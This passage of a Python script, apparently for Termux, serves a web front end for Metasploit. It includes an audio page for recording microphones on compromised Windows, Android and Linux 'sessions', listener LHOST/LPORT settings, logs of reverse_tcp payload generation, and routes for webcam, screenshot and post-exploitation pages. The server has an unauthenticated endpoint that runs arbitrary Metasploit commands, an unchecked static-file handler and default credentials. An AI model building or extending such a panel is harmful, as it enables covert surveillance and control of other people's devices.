            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }

        .action-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .action-btn.recording {
            border-color: #ff0000;
            color: #ff0000;
            animation: pulse 1s infinite;
        }

        .action-btn.recording:hover {
            background: #ff0000;
            color: var(--dark-bg);
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .duration-selector {
            margin-bottom: 20px;
        }

        .duration-options {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 10px;
        }

        .duration-btn {
            background: transparent;
            border: 1px solid var(--hacker-purple);
            color: var(--hacker-purple);
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .duration-btn:hover {
            background: var(--hacker-purple);
            color: var(--dark-bg);
        }

        .duration-btn.active {
            background: var(--hacker-purple);
            color: var(--dark-bg);
        }

        .audio-visualizer {
            background: #001100;
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            height: 150px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }

        .visualizer-bars {
            display: flex;
            align-items: end;
            justify-content: space-around;
            height: 100%;
            padding: 20px;
        }

        .visualizer-bar {
            background: var(--hacker-green);
            width: 8px;
            border-radius: 4px 4px 0 0;
            transition: height 0.1s ease;
        }

        .recording-status {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
        }

        .status-online {
            color: var(--hacker-green);
        }

        .status-offline {
            color: #ff0000;
        }

        .recordings-list {
            max-height: 400px;
            overflow-y: auto;
        }

        .recording-item {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .recording-info {
            flex: 1;
        }

        .recording-actions {
            display: flex;
            gap: 10px;
        }

        .small-btn {
            background: transparent;
            border: 1px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            font-size: 0.8em;
            transition: all 0.3s;
        }

        .small-btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .recording-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #ff0000;
            margin-right: 10px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">AUDIO RECORDING</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/webcam" class="nav-btn">Webcam</a>
                <a href="/screenshots" class="nav-btn">Screenshots</a>
            </nav>
        </header>

        <div class="audio-interface">
            <div class="control-panel">
                <div class="panel-header">
                    <h3>🎤 Audio Controls</h3>
                </div>

                <div class="session-selector">
                    <label>Select Session:</label>
                    <select id="audio-session">
                        <option value="">Select a session...</option>
                        <option value="1">Session 1 - Windows (192.168.1.100)</option>
                        <option value="2">Session 2 - Android (192.168.1.101)</option>
                        <option value="3">Session 3 - Linux (192.168.1.102)</option>
                    </select>
                </div>

                <div class="recording-controls">
                    <button class="action-btn" onclick="startRecording()" id="start-btn">
                        🎤 Start Recording
                    </button>
                    <button class="action-btn" onclick="stopRecording()" id="stop-btn" disabled>
                        ⏹️ Stop Recording
                    </button>
                </div>

                <div class="duration-selector">
                    <label>Recording Duration:</label>
                    <div class="duration-options">
                        <button class="duration-btn active" onclick="setDuration(30)">30s</button>
                        <button class="duration-btn" onclick="setDuration(60)">1m</button>
                        <button class="duration-btn" onclick="setDuration(300)">5m</button>
                    </div>
                </div>

                <div class="audio-visualizer">
                    <div class="visualizer-bars" id="visualizer-bars">
                        <!-- Visualizer bars will be generated here -->
                    </div>
                </div>

                <div class="recording-status">
                    <h4>Status:</h4>
                    <div id="recording-status-text" class="status-offline">Not recording</div>
                    <div id="recording-info" style="margin-top: 10px; font-size: 0.9em;">
                        Select a session and start recording
                    </div>
                </div>
            </div>

            <div class="recordings-panel">
                <div class="panel-header">
                    <h3>📁 Recordings</h3>
                    <div style="font-size: 0.9em; color: var(--hacker-blue);">
                        Total: <span id="recordings-count">3</span> files
                    </div>
                </div>

                <div class="recordings-list" id="recordings-list">
                    <!-- Recordings will be loaded here -->
                </div>
            </div>
        </div>
    </div>

    <script>
        let isRecording = false;
        let recordingDuration = 30;
        let recordingInterval;
        let visualizerInterval;

        const sampleRecordings = [
            {
                id: 1,
                session: 'Session 1',
                filename: 'audio_1_20241201_120030.wav',
                timestamp: '2024-12-01 12:00:30',
                duration: '30s',
                size: '2.4 MB'
            },
            {
                id: 2,
                session: 'Session 2',
                filename: 'audio_2_20241201_115945.wav',
                timestamp: '2024-12-01 11:59:45',
                duration: '60s',
                size: '4.8 MB'
            },
            {
                id: 3,
                session: 'Session 1',
                filename: 'audio_1_20241201_113230.wav',
                timestamp: '2024-12-01 11:32:30',
                duration: '30s',
                size: '2.4 MB'
            }
        ];

        function loadRecordings() {
            const recordingsList = document.getElementById('recordings-list');
            recordingsList.innerHTML = '';

            sampleRecordings.forEach(recording => {
                const item = document.createElement('div');
                item.className = 'recording-item';
                item.innerHTML = `
                    <div class="recording-info">
                        <div style="font-weight: bold; margin-bottom: 5px;">${recording.filename}</div>
                        <div style="font-size: 0.8em; color: #888; margin-bottom: 5px;">
                            ${recording.timestamp} | Duration: ${recording.duration} | Size: ${recording.size}
                        </div>
                        <div style="font-size: 0.8em;">
                            Session: ${recording.session}
                        </div>
                    </div>
                    <div class="recording-actions">
                        <button class="small-btn" onclick="playRecording(${recording.id})">Play</button>
                        <button class="small-btn" onclick="downloadRecording(${recording.id})">Download</button>
                        <button class="small-btn" onclick="deleteRecording(${recording.id})">Delete</button>
                    </div>
                `;
                recordingsList.appendChild(item);
            });

            document.getElementById('recordings-count').textContent = sampleRecordings.length;
        }

        function setDuration(duration) {
            recordingDuration = duration;
            
            // Atualizar botões ativos
            document.querySelectorAll('.duration-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
        }

        function startRecording() {
            const session = document.getElementById('audio-session').value;
            if (!session) {
                alert('Please select a session first');
                return;
            }

            const startBtn = document.getElementById('start-btn');
            const stopBtn = document.getElementById('stop-btn');
            const statusText = document.getElementById('recording-status-text');

            startBtn.disabled = true;
            stopBtn.disabled = false;
            statusText.textContent = `Recording - Session ${session}`;
            statusText.className = 'status-online';

            isRecording = true;

            // Iniciar visualizador
            startVisualizer();

            // Simular gravação
            let timeLeft = recordingDuration;
            updateRecordingInfo(timeLeft);

            recordingInterval = setInterval(() => {
                timeLeft--;
                updateRecordingInfo(timeLeft);

                if (timeLeft <= 0) {
                    stopRecording();
                    // Adicionar nova gravação à lista
                    const timestamp = new Date().toLocaleString('en-US', { 
                        year: 'numeric', 
                        month: '2-digit', 
                        day: '2-digit',
                        hour: '2-digit',
                        minute: '2-digit',
                        second: '2-digit',
                        hour12: false 
                    }).replace(/[/,]/g, '').replace(/ /g, '_');

                    const newRecording = {
                        id: sampleRecordings.length + 1,
                        session: `Session ${session}`,
                        filename: `audio_${session}_${timestamp}.wav`,
                        timestamp: new Date().toLocaleString(),
                        duration: `${recordingDuration}s`,
                        size: `${(recordingDuration * 0.08).toFixed(1)} MB`
                    };

                    sampleRecordings.unshift(newRecording);
                    loadRecordings();
                }
            }, 1000);
        }

        function stopRecording() {
            const startBtn = document.getElementById('start-btn');
            const stopBtn = document.getElementById('stop-btn');
            const statusText = document.getElementById('recording-status-text');

            startBtn.disabled = false;
            stopBtn.disabled = true;
            statusText.textContent = 'Not recording';
            statusText.className = 'status-offline';

            isRecording = false;
            clearInterval(recordingInterval);
            clearInterval(visualizerInterval);

            document.getElementById('recording-info').textContent = 'Select a session and start recording';
        }

        function updateRecordingInfo(timeLeft) {
            const session = document.getElementById('audio-session').value;
            document.getElementById('recording-info').innerHTML = `
                Session: ${session}<br>
                Time remaining: ${timeLeft}s<br>
                Format: WAV (16-bit, 44.1kHz)
            `;
        }

        function startVisualizer() {
            const visualizer = document.getElementById('visualizer-bars');
            visualizer.innerHTML = '';

            // Criar barras do visualizador
            for (let i = 0; i < 20; i++) {
                const bar = document.createElement('div');
                bar.className = 'visualizer-bar';
                bar.style.height = '10px';
                visualizer.appendChild(bar);
            }

            const bars = document.querySelectorAll('.visualizer-bar');

            visualizerInterval = setInterval(() => {
                bars.forEach(bar => {
                    const height = Math.random() * 100 + 10;
                    bar.style.height = `${height}px`;
                    bar.style.background = `hsl(${Math.random() * 120 + 120}, 100%, 50%)`;
                });
            }, 100);
        }

        function playRecording(recordingId) {
            const recording = sampleRecordings.find(r => r.id === recordingId);
            if (recording) {
                alert(`Playing: ${recording.filename}\nThis is a simulation - in production would play actual audio`);
            }
        }

        function downloadRecording(recordingId) {
            const recording = sampleRecordings.find(r => r.id === recordingId);
            if (recording) {
                alert(`Downloading: ${recording.filename}`);
            }
        }

        function deleteRecording(recordingId) {
            if (confirm('Are you sure you want to delete this recording?')) {
                const index = sampleRecordings.findIndex(r => r.id === recordingId);
                if (index !== -1) {
                    sampleRecordings.splice(index, 1);
                    loadRecordings();
                    alert('Recording deleted');
                }
            }
        }

        // Inicializar
        document.addEventListener('DOMContentLoaded', function() {
            loadRecordings();
            
            // Parar gravação se a sessão mudar
            document.getElementById('audio-session').addEventListener('change', function() {
                if (isRecording) {
                    stopRecording();
                }
            });
        });
    </script>
</body>
</html>
"""

    def generate_settings_html(self):
        """Configurações do sistema"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .settings-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .settings-tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            border-bottom: 1px solid var(--hacker-purple);
            padding-bottom: 10px;
        }

        .tab-btn {
            background: transparent;
            border: 1px solid var(--hacker-purple);
            color: var(--hacker-purple);
            padding: 10px 20px;
            border-radius: 5px 5px 0 0;
            cursor: pointer;
            transition: all 0.3s;
        }

        .tab-btn.active {
            background: var(--hacker-purple);
            color: var(--dark-bg);
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--hacker-blue);
        }

        .form-group input, .form-group select, .form-group textarea {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .form-group textarea {
            height: 100px;
            resize: vertical;
        }

        .settings-actions {
            display: flex;
            gap: 10px;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid var(--hacker-green);
        }

        .btn {
            background: transparent;
            border: 2px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }

        .btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .btn-success {
            border-color: var(--hacker-green);
            color: var(--hacker-green);
        }

        .btn-success:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .btn-danger {
            border-color: #ff0000;
            color: #ff0000;
        }

        .btn-danger:hover {
            background: #ff0000;
            color: var(--dark-bg);
        }

        .system-info {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            border-radius: 5px;
            padding: 15px;
            margin-top: 20px;
        }

        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }

        .info-item {
            margin-bottom: 10px;
        }

        .info-label {
            color: var(--hacker-blue);
            font-weight: bold;
        }

        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 10px;
        }

        .status-online {
            background: var(--hacker-green);
            box-shadow: 0 0 10px var(--hacker-green);
        }

        .status-offline {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">SYSTEM SETTINGS</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/payloads" class="nav-btn">Payloads</a>
                <a href="/sessions" class="nav-btn">Sessions</a>
            </nav>
        </header>

        <div class="settings-panel">
            <div class="panel-header">
                <h3>⚙️ Configuration Panel</h3>
            </div>

            <div class="settings-tabs">
                <button class="tab-btn active" onclick="openTab('general')">General</button>
                <button class="tab-btn" onclick="openTab('network')">Network</button>
                <button class="tab-btn" onclick="openTab('security')">Security</button>
                <button class="tab-btn" onclick="openTab('system')">System Info</button>
            </div>

            <div id="general" class="tab-content active">
                <div class="form-group">
                    <label>Web Interface Port:</label>
                    <input type="number" id="web-port" value="8080" min="1024" max="65535">
                </div>

                <div class="form-group">
                    <label>Metasploit RPC Port:</label>
                    <input type="number" id="rpc-port" value="55553" min="1024" max="65535">
                </div>

                <div class="form-group">
                    <label>RPC Username:</label>
                    <input type="text" id="rpc-user" value="msf">
                </div>

                <div class="form-group">
                    <label>RPC Password:</label>
                    <input type="password" id="rpc-pass" value="password">
                </div>

                <div class="form-group">
                    <label>Theme:</label>
                    <select id="theme">
                        <option value="dark">Dark Theme</option>
                        <option value="matrix">Matrix Theme</option>
                        <option value="terminal">Terminal Theme</option>
                    </select>
                </div>
            </div>

            <div id="network" class="tab-content">
                <div class="form-group">
                    <label>LHOST (Default Listener IP):</label>
                    <input type="text" id="lhost" value="192.168.1.100" placeholder="Your IP address">
                </div>

                <div class="form-group">
                    <label>LPORT Range (Payload Generation):</label>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                        <input type="number" id="lport-min" value="4444" placeholder="Min port">
                        <input type="number" id="lport-max" value="5555" placeholder="Max port">
                    </div>
                </div>

                <div class="form-group">
                    <label>Proxy Settings:</label>
                    <input type="text" id="proxy" placeholder="http://proxy:8080">
                </div>

                <div class="form-group">
                    <label>DNS Server:</label>
                    <input type="text" id="dns" value="8.8.8.8">
                </div>
            </div>

            <div id="security" class="tab-content">
                <div class="form-group">
                    <label>API Key:</label>
                    <input type="text" id="api-key" value="msf_web_${Math.random().toString(36).substr(2, 16)}" readonly>
                    <button class="btn" onclick="generateApiKey()" style="margin-top: 5px; width: auto;">Generate New Key</button>
                </div>

                <div class="form-group">
                    <label>SSL Certificate:</label>
                    <textarea id="ssl-cert" placeholder="Paste SSL certificate here..."></textarea>
                </div>

                <div class="form-group">
                    <label>SSL Private Key:</label>
                    <textarea id="ssl-key" placeholder="Paste SSL private key here..."></textarea>
                </div>

                <div class="form-group">
                    <label>Enable Two-Factor Authentication:</label>
                    <select id="2fa">
                        <option value="false">Disabled</option>
                        <option value="true">Enabled</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Session Timeout (minutes):</label>
                    <input type="number" id="session-timeout" value="30" min="5" max="1440">
                </div>
            </div>

            <div id="system" class="tab-content">
                <div class="system-info">
                    <h4 style="margin-bottom: 15px; color: var(--hacker-blue);">System Status</h4>
                    <div class="info-grid">
                        <div class="info-item">
                            <span class="info-label">Metasploit Service:</span>
                            <span class="status-indicator status-online"></span> Online
                        </div>
                        <div class="info-item">
                            <span class="info-label">Web Server:</span>
                            <span class="status-indicator status-online"></span> Running
                        </div>
                        <div class="info-item">
                            <span class="info-label">Database:</span>
                            <span class="status-indicator status-online"></span> Connected
                        </div>
                        <div class="info-item">
                            <span class="info-label">Sessions:</span> 3 Active
                        </div>
                        <div class="info-item">
                            <span class="info-label">Uptime:</span> 2h 34m
                        </div>
                        <div class="info-item">
                            <span class="info-label">Memory Usage:</span> 45%
                        </div>
                        <div class="info-item">
                            <span class="info-label">CPU Load:</span> 12%
                        </div>
                        <div class="info-item">
                            <span class="info-label">Disk Space:</span> 1.2GB / 8GB
                        </div>
                    </div>
                </div>

                <div class="form-group" style="margin-top: 20px;">
                    <label>System Logs:</label>
                    <textarea id="system-logs" readonly style="height: 200px; font-size: 0.8em;">
[2024-12-01 12:00:00] INFO: Metasploit Web Interface started
[2024-12-01 12:00:05] INFO: RPC service connected successfully
[2024-12-01 12:05:30] INFO: New session established (Session 1)
[2024-12-01 12:10:15] INFO: Payload generated: windows/meterpreter/reverse_tcp
[2024-12-01 12:15:20] INFO: Screenshot captured from Session 1
                    </textarea>
                </div>

                <div class="form-group">
                    <label>Backup Configuration:</label>
                    <div style="display: flex; gap: 10px;">
                        <button class="btn" onclick="backupConfig()">Backup Now</button>
                        <button class="btn" onclick="restoreConfig()">Restore Backup</button>
                    </div>
                </div>
            </div>

            <div class="settings-actions">
                <button class="btn btn-success" onclick="saveSettings()">💾 Save Settings</button>
                <button class="btn" onclick="resetSettings()">🔄 Reset to Default</button>
                <button class="btn btn-danger" onclick="restartServices()">🔄 Restart Services</button>
            </div>
        </div>
    </div>

    <script>
        function openTab(tabName) {
            // Esconder todas as abas
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Mostrar a aba selecionada
            document.getElementById(tabName).classList.add('active');
            
            // Atualizar botões das abas
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
        }

        function generateApiKey() {
            const newKey = 'msf_web_' + Math.random().toString(36).substr(2, 16) + '_' + Date.now().toString(36);
            document.getElementById('api-key').value = newKey;
            alert('New API key generated!');
        }

        function saveSettings() {
            const settings = {
                webPort: document.getElementById('web-port').value,
                rpcPort: document.getElementById('rpc-port').value,
                rpcUser: document.getElementById('rpc-user').value,
                rpcPass: document.getElementById('rpc-pass').value,
                theme: document.getElementById('theme').value,
                lhost: document.getElementById('lhost').value,
                lportMin: document.getElementById('lport-min').value,
                lportMax: document.getElementById('lport-max').value,
                proxy: document.getElementById('proxy').value,
                dns: document.getElementById('dns').value,
                apiKey: document.getElementById('api-key').value,
                twoFactor: document.getElementById('2fa').value,
                sessionTimeout: document.getElementById('session-timeout').value
            };

            // Simular salvamento
            alert('Settings saved successfully!\nSome changes may require service restart.');
            console.log('Settings saved:', settings);
        }

        function resetSettings() {
            if (confirm('Are you sure you want to reset all settings to default?')) {
                document.getElementById('web-port').value = '8080';
                document.getElementById('rpc-port').value = '55553';
                document.getElementById('rpc-user').value = 'msf';
                document.getElementById('rpc-pass').value = 'password';
                document.getElementById('theme').value = 'dark';
                document.getElementById('lhost').value = '192.168.1.100';
                document.getElementById('lport-min').value = '4444';
                document.getElementById('lport-max').value = '5555';
                document.getElementById('proxy').value = '';
                document.getElementById('dns').value = '8.8.8.8';
                document.getElementById('2fa').value = 'false';
                document.getElementById('session-timeout').value = '30';
                
                alert('Settings reset to default values');
            }
        }

        function restartServices() {
            if (confirm('Are you sure you want to restart all services? This may interrupt active sessions.')) {
                alert('Services restarting...\nPlease wait a few moments.');
                // Simular reinício
                setTimeout(() => {
                    alert('Services restarted successfully!');
                }, 2000);
            }
        }

        function backupConfig() {
            alert('Configuration backup created successfully!\nBackup file: metasploit_web_backup.json');
        }

        function restoreConfig() {
            const fileInput = document.createElement('input');
            fileInput.type = 'file';
            fileInput.accept = '.json';
            fileInput.onchange = function(e) {
                alert('Configuration restored from backup!');
            };
            fileInput.click();
        }

        // Carregar configurações atuais (simulado)
        document.addEventListener('DOMContentLoaded', function() {
            // Em produção, carregaria as configurações reais do servidor
            console.log('Settings page loaded');
        });
    </script>
</body>
</html>
"""

    def start_web_server(self):
        """Inicia servidor web"""
        class MetasploitWebHandler(BaseHTTPRequestHandler):
            msf_web = self
            
            def do_GET(self):
                """Manipula requisições GET"""
                try:
                    parsed_path = urlparse(self.path)
                    path = parsed_path.path
                    
                    # Rotas da aplicação
                    routes = {
                        '/': 'index',
                        '/dashboard': 'dashboard',
                        '/payloads': 'payloads',
                        '/sessions': 'sessions',
                        '/exploits': 'exploits',
                        '/post_exploitation': 'post_exploitation',
                        '/webcam': 'webcam',
                        '/screenshots': 'screenshots',
                        '/audio': 'audio',
                        '/settings': 'settings'
                    }
                    
                    if path in routes:
                        self.serve_template(routes[path])
                    elif path == '/api/sessions':
                        self.api_get_sessions()
                    elif path == '/api/execute':
                        self.api_execute_command()
                    else:
                        # Servir arquivos estáticos se existirem
                        self.serve_static_file(path)
                        
                except Exception as e:
                    self.send_error(500, f"Server error: {str(e)}")
            
            def serve_template(self, template_name):
                """Serve templates HTML"""
                try:
                    html_content = self.msf_web.generate_html_template(template_name)
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(html_content.encode('utf-8'))
                    
                except Exception as e:
                    self.send_error(500, f"Template error: {str(e)}")
            
            def serve_static_file(self, path):
                """Serve arquivos estáticos"""
                try:
                    # Mapear caminhos para arquivos locais
                    if path == '/favicon.ico':
                        self.send_response(404)
                        self.end_headers()
                        return
                    
                    # Tentar servir arquivo do sistema de arquivos
                    clean_path = path.lstrip('/')
                    if os.path.exists(clean_path):
                        with open(clean_path, 'rb') as f:
                            content = f.read()
                        
                        # Determinar tipo MIME
                        mime_type = mimetypes.guess_type(clean_path)[0] or 'application/octet-stream'
                        
                        self.send_response(200)
                        self.send_header('Content-type', mime_type)
                        self.end_headers()
                        self.wfile.write(content)
                    else:
                        self.send_error(404, "File not found")
                        
                except Exception as e:
                    self.send_error(500, f"File serving error: {str(e)}")
            
            def api_get_sessions(self):
                """API: Retorna sessões"""
                try:
                    sessions = self.msf_web.get_sessions()
                    self.send_json_response(sessions)
                except Exception as e:
                    self.send_json_response({'error': str(e)})
            
            def api_execute_command(self):
                """API: Executa comando MSF"""
                try:
                    query_params = parse_qs(urlparse(self.path).query)
                    command = query_params.get('command', [None])[0]
                    
                    if command:
                        result = self.msf_web.execute_msf_command(command)
                        self.send_json_response({'success': True, 'result': result})
                    else:
                        self.send_json_response({'success': False, 'error': 'No command provided'})
                        
                except Exception as e:
                    self.send_json_response({'success': False, 'error': str(e)})
            
            def send_json_response(self, data):
                """Envia resposta JSON"""
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(data).encode())
            
            def log_message(self, format, *args):
                """Customiza logging"""
                print(f"[WEB] {self.client_address[0]} - {format % args}")
        
        try:
            server_address = ('', self.config['web_port'])
            self.web_server = HTTPServer(server_address, MetasploitWebHandler)
            print(f"[+] Metasploit Web Interface started on port {self.config['web_port']}")
            print(f"[+] Access: http://localhost:{self.config['web_port']}")
            print(f"[+] Network access: http://{socket.gethostbyname(socket.gethostname())}:{self.config['web_port']}")
            
            self.web_server.serve_forever()
            
        except Exception as e:
            print(f"[-] Web server error: {e}")
            import traceback
            traceback.print_exc()
    
    def start(self):
        """Inicia todos os serviços"""
        print("[+] Starting Metasploit Web Interface...")
        print(f"[+] Web Interface: http://0.0.0.0:{self.config['web_port']}")
        
        # Iniciar serviço do Metasploit
        if not self.start_metasploit_service():
            print("[-] Failed to start Metasploit service")
            print("[!] Continuing with web interface only...")
        
        # Iniciar servidor web
        self.start_web_server()

def main():
    # Verificar se está no Termux
    if not os.path.exists('/data/data/com.termux/files/usr'):
        print("[!] This script is optimized for Termux")
        print("[!] Some features may not work properly outside Termux")
    
    # Verificar se Metasploit está instalado
    try:
        subprocess.run(['msfconsole', '--version'], capture_output=True)
        print("[+] Metasploit framework detected")
    except:
        print("[-] Metasploit not found. Please install Metasploit first.")
        print("    Run: pkg install metasploit")
        print("[!] Starting web interface without Metasploit integration...")
    
    # Criar interface
    msf_web = MetasploitWebInterface()
    
    try:
        msf_web.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down Metasploit Web Interface...")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
